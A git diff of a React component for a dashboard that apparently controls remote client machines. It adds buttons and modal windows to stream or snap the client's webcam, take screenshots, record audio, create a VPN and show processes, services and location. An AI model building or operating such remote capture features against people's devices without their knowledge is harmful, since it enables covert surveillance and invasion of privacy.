@@ -19,9 +19,9 @@ import { MapContainer, Marker, Popup, TileLayer } from 'react-leaflet';
 import 'leaflet/dist/leaflet.css';
 import { CameraStream } from 'components/CameraStream/CameraStream';
 import { AudioStream } from 'components/AudioStream/AudioStream';
+import { MediaCapture } from 'components/PhotoStream/PhotoStream';
 
 const { TabPane } = Tabs;
-
 const backendUrl = 'http://localhost:4000';
 
 // ---------- Типы данных ----------
@@ -58,7 +58,7 @@ interface ClientNode {
     IP: string;
     Status: string;
     Metrics: Metrics;
-    AppsServices: AppsServices; // Уже объект
+    AppsServices: AppsServices;
 }
 
 interface Location {
@@ -83,19 +83,17 @@ export const ClientDetails: React.FC = () => {
     const [node, setNode] = useState<ClientNode | null>(null);
     const [position, setPosition] = useState<Location | null>(null);
 
-    // Модалки
+    // Модальные окна
     const [webcamModalVisible, setWebcamModalVisible] = useState(false);
+    const [captureModalVisible, setCaptureModalVisible] = useState(false);
     const [screenshotModalVisible, setScreenshotModalVisible] = useState(false);
     const [audioModalVisible, setAudioModalVisible] = useState(false);
 
-    // Пути к файлам
+    // Пути к файлам (используются для вебкамеры, если не применяем стрим через WS)
     const [webcamUrl, setWebcamUrl] = useState(`${backendUrl}/uploads/latest_frame.jpg`);
-    const [screenshotUrl, setScreenshotUrl] = useState(
-        `${backendUrl}/uploads/latest_screenshot.jpg`
-    );
     const [audioUrl, setAudioUrl] = useState(`${backendUrl}/uploads/latest_recorded_audio.wav`);
 
-    // ID таймера (снимки вебкамеры)
+    // ID таймера для обновления вебкамеры (если используется)
     const webcamIntervalRef = useRef<number | null>(null);
 
     // Загрузка данных
@@ -106,7 +104,6 @@ export const ClientDetails: React.FC = () => {
         }
     }, [id]);
 
-    // Получаем ClientNode с бэка
     const fetchById = async () => {
         try {
             const res = await instance.get<ClientNode>(`/api/clients/${id}`);
@@ -116,7 +113,6 @@ export const ClientDetails: React.FC = () => {
         }
     };
 
-    // Получаем координаты
     const fetchMap = async () => {
         try {
             const res = await instance.get<Location>(`/api/map/${id}`);
@@ -129,7 +125,7 @@ export const ClientDetails: React.FC = () => {
     // Отправка команд
     const sendCommand = async (cmd: string) => {
         try {
-            let body: SendCommandBody = {
+            const body: SendCommandBody = {
                 command: cmd,
                 device_id: id || ''
             };
@@ -141,29 +137,19 @@ export const ClientDetails: React.FC = () => {
         }
     };
 
-    // Нотификации
     const openNotificationWithIcon = (type: NotificationType, cmd: string) => {
-        if (type === 'success') {
-            api[type]({
-                message: `The command "${cmd}" has been sent successfully`
-            });
-        } else if (type === 'error') {
-            api[type]({
-                message: `Error while sending command "${cmd}"`
-            });
-        } else {
-            api[type]({
-                message: `Command "${cmd}" status: ${type}`
-            });
-        }
+        api[type]({
+            message:
+                type === 'success'
+                    ? `The command "${cmd}" has been sent successfully`
+                    : `Error while sending command "${cmd}"`
+        });
     };
 
-    // Кнопка назад
     const handleBack = () => {
         navigate(-1);
     };
 
-    // Форматирование байтов
     const formatBytes = (bytes: number, decimals = 2) => {
         if (!bytes) return '0 Bytes';
         const k = 1024;
@@ -173,10 +159,9 @@ export const ClientDetails: React.FC = () => {
         return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
     };
 
-    // Координаты карты
     const mapCenter: [number, number] = position ? [position.lat, position.lon] : [51.505, -0.09];
 
-    // Dropdown USB
+    // Dropdown меню
     const usbItems: MenuProps['items'] = [
         {
             key: 'on',
@@ -197,8 +182,9 @@ export const ClientDetails: React.FC = () => {
             onClick: () => handleOpenWebcamModal()
         },
         {
-            key: 'take_of_picture',
-            label: 'Take a picture with a webcam'
+            key: 'capture_frame',
+            label: 'Take a picture with webcam',
+            onClick: () => handleCaptureFrameModal()
         }
     ];
 
@@ -214,52 +200,43 @@ export const ClientDetails: React.FC = () => {
         }
     ];
 
-    // Вебкамера
+    // Обработчики для модалок
     const handleOpenWebcamModal = async () => {
         await sendCommand('start_camera');
         setWebcamModalVisible(true);
-
-        // Каждую секунду обновляем картинку
-        webcamIntervalRef.current = window.setInterval(() => {
-            setWebcamUrl(`${backendUrl}/uploads/latest_frame.jpg?t=${Date.now()}`);
-        }, 1000);
     };
 
     const handleStopWebcamModal = async () => {
         await sendCommand('stop_camera');
         setWebcamModalVisible(false);
-
-        if (webcamIntervalRef.current !== null) {
-            clearInterval(webcamIntervalRef.current);
-            webcamIntervalRef.current = null;
-        }
     };
 
-    // Скриншот
-    const handleScreenshot = async () => {
-        await sendCommand('screenshot');
+    const handleCaptureFrameModal = async () => {
+        await sendCommand('capture_frame');
+        // Задержка для получения ответа
         setTimeout(() => {
-            setScreenshotUrl(`${backendUrl}/uploads/latest_screenshot.jpg?t=${Date.now()}`);
-            setScreenshotModalVisible(true);
-        }, 1000);
+            setCaptureModalVisible(true);
+        }, 2000);
     };
 
-    // Аудио
+    const handleScreenshotModal = async () => {
+        await sendCommand('screenshot');
+        setScreenshotModalVisible(true);
+    };
+
     const handleRecordAudio = async () => {
         await sendCommand('record_audio');
         setTimeout(() => {
-            setAudioUrl(`${backendUrl}/uploads/latest_recorded_audio.wav?t=${Date.now()}`);
             setAudioModalVisible(true);
         }, 2000);
     };
 
-    // Колонки для процессов
+    // Колонки для таблиц процессов и служб (оставляем без изменений)
     const processColumns = [
         { title: 'PID', dataIndex: 'pid' },
         { title: 'Name', dataIndex: 'name' }
     ];
 
-    // Колонки для служб
     const serviceColumns = [
         { title: 'Name', dataIndex: 'name' },
         { title: 'Display Name', dataIndex: 'display_name' },
@@ -278,7 +255,6 @@ export const ClientDetails: React.FC = () => {
                 </Col>
                 <Col>
                     <Space>
-                        {/* <Button onClick={handleOpenWebcamModal}>Webcam</Button> */}
                         <Dropdown menu={{ items: cameraItems }} placement="bottomLeft">
                             <Button>Webcam</Button>
                         </Dropdown>
@@ -291,7 +267,7 @@ export const ClientDetails: React.FC = () => {
                         <Button onClick={() => sendCommand('create_vpn')}>
                             Create VPN connection
                         </Button>
-                        <Button onClick={handleScreenshot}>Take Screenshot</Button>
+                        <Button onClick={handleScreenshotModal}>Take Screenshot</Button>
                     </Space>
                 </Col>
             </Row>
@@ -322,13 +298,8 @@ export const ClientDetails: React.FC = () => {
                 )}
             </div>
 
-            {/* Табы */}
+            {/* Табы для процессов, служб и логов */}
             <Tabs defaultActiveKey="details">
-                {/* <TabPane tab="Details" key="details">
-                    <p>Здесь можно вывести дополнительную информацию о деталях.</p>
-                </TabPane> */}
-
-                {/* Software: processes */}
                 <TabPane tab="Software" key="software">
                     <Table
                         dataSource={node?.AppsServices?.processes || []}
@@ -337,8 +308,6 @@ export const ClientDetails: React.FC = () => {
                         pagination={{ pageSize: 5 }}
                     />
                 </TabPane>
-
-                {/* Service: services */}
                 <TabPane tab="Service" key="service">
                     <Table
                         dataSource={node?.AppsServices?.services || []}
@@ -347,7 +316,6 @@ export const ClientDetails: React.FC = () => {
                         pagination={{ pageSize: 5 }}
                     />
                 </TabPane>
-
                 <TabPane tab="Scripts" key="scripts">
                     <p>Какие-то запросы/логи.</p>
                 </TabPane>
@@ -373,39 +341,49 @@ export const ClientDetails: React.FC = () => {
                 </div>
             </div>
 
-            {/* Webcam Modal */}
+            {/* Модальное окно для вебкамеры */}
             <Modal
                 title="Webcam streaming"
                 open={webcamModalVisible}
                 closable={false}
                 maskClosable={false}
                 footer={<Button onClick={handleStopWebcamModal}>Stop streaming</Button>}
+                destroyOnClose
             >
-                <CameraStream id={id || ''} />
+                <CameraStream id={id} />
             </Modal>
 
-            {/* Screenshot Modal */}
+            {/* Модальное окно для captured frame */}
+            <Modal
+                title="Captured Frame"
+                open={captureModalVisible}
+                onCancel={() => setCaptureModalVisible(false)}
+                footer={null}
+                destroyOnClose
+            >
+                <MediaCapture id={id} mode="capture" />
+            </Modal>
+
+            {/* Модальное окно для скриншота */}
             <Modal
                 title="Screenshot"
                 open={screenshotModalVisible}
                 onCancel={() => setScreenshotModalVisible(false)}
                 footer={null}
+                destroyOnClose
             >
-                <img
-                    src={screenshotUrl}
-                    alt="Screenshot"
-                    style={{ width: '100%', border: '1px solid #ccc' }}
-                />
+                <MediaCapture id={id} mode="screenshot" />
             </Modal>
 
-            {/* Audio Modal */}
+            {/* Модальное окно для аудио */}
             <Modal
                 title="Recorded audio"
                 open={audioModalVisible}
                 onCancel={() => setAudioModalVisible(false)}
                 footer={null}
+                destroyOnClose
             >
-                <AudioStream deviceId={id || ''} />
+                <AudioStream deviceId={id} />
             </Modal>
         </div>
     );
